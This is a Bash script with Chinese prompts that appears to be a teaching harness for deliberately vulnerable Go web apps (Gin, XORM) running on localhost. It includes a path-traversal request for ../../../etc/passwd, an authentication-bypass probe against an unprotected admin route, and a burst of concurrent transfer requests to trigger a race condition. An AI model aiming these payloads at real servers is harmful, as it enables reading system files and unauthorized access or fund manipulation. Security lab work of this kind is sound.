#!/bin/bash

echo "=== Go框架漏洞测试脚本 ==="
echo "本脚本将演示Gin和XORM框架中的罕见漏洞"
echo ""

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 测试路径遍历漏洞
test_path_traversal() {
    echo -e "${YELLOW}[测试1] Gin框架路径遍历漏洞${NC}"
    echo "1. 尝试访问正常文件:"
    curl -s "http://localhost:8080/download?file=test.txt"
    echo -e "\n"
    
    echo "2. 尝试路径遍历攻击:"
    curl -s "http://localhost:8080/download?file=../../../etc/passwd"
    echo -e "\n"
    
    echo "3. 测试安全版本（应该被阻止）:"
    curl -s "http://localhost:8081/download?file=../../../etc/passwd"
    echo -e "\n"
}

# 测试权限绕过漏洞
test_auth_bypass() {
    echo -e "${YELLOW}[测试2] Gin框架权限绕过漏洞${NC}"
    echo "1. 尝试访问受保护的路由（需要认证）:"
    curl -s -i "http://localhost:8080/admin/panel" | head -n 1
    echo ""
    
    echo "2. 尝试绕过认证（直接访问未保护的路由）:"
    curl -s "http://localhost:8080/admin-panel"
    echo -e "\n"
}

# 测试竞态条件
test_race_condition() {
    echo -e "${YELLOW}[测试3] Gin框架竞态条件漏洞${NC}"
    echo "初始余额:"
    echo -n "Alice: "
    curl -s "http://localhost:8082/vulnerable/balance/alice" | jq -r '.balance'
    echo -n "Bob: "
    curl -s "http://localhost:8082/vulnerable/balance/bob" | jq -r '.balance'
    
    echo -e "\n发起10个并发转账请求（每次100元）:"
    for i in {1..10}; do
        curl -s -X POST "http://localhost:8082/vulnerable/transfer" \
            -H "Content-Type: application/json" \
            -d '{"from":"alice","to":"bob","amount":100}' > /dev/null &
    done
    
    # 等待所有请求完成
    wait
    
    echo -e "\n最终余额（可能出现异常）:"
    echo -n "Alice: "
    curl -s "http://localhost:8082/vulnerable/balance/alice" | jq -r '.balance'
    echo -n "Bob: "
    curl -s "http://localhost:8082/vulnerable/balance/bob" | jq -r '.balance'
}

# 测试二阶SQL注入
test_second_order_injection() {
    echo -e "${YELLOW}[测试4] XORM二阶SQL注入漏洞${NC}"
    echo "该测试需要运行xorm-vuln/second_order_injection.go"
    echo "漏洞演示将在程序运行时自动展示"
}

# 主菜单
show_menu() {
    echo -e "\n${GREEN}选择要测试的漏洞:${NC}"
    echo "1. Gin路径遍历漏洞"
    echo "2. Gin权限绕过漏洞"
    echo "3. Gin竞态条件漏洞"
    echo "4. 运行所有测试"
    echo "5. 退出"
    echo -n "请选择 (1-5): "
}

# 检查服务是否运行
check_services() {
    echo -e "${GREEN}检查服务状态...${NC}"
    
    if ! curl -s "http://localhost:8080" > /dev/null 2>&1; then
        echo -e "${RED}警告: localhost:8080 服务未运行${NC}"
        echo "请先运行: go run gin-vuln/path_traversal.go"
        return 1
    fi
    
    if ! curl -s "http://localhost:8082" > /dev/null 2>&1; then
        echo -e "${RED}警告: localhost:8082 服务未运行${NC}"
        echo "请先运行: go run gin-vuln/race_condition.go"
        return 1
    fi
    
    return 0
}

# 主循环
main() {
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                if check_services; then
                    test_path_traversal
                fi
                ;;
            2)
                if check_services; then
                    test_auth_bypass
                fi
                ;;
            3)
                if check_services; then
                    test_race_condition
                fi
                ;;
            4)
                if check_services; then
                    test_path_traversal
                    echo -e "\n---\n"
                    test_auth_bypass
                    echo -e "\n---\n"
                    test_race_condition
                fi
                ;;
            5)
                echo "退出测试"
                exit 0
                ;;
            *)
                echo -e "${RED}无效的选择${NC}"
                ;;
        esac
        
        echo -e "\n按Enter键继续..."
        read
    done
}

# 运行主程序
main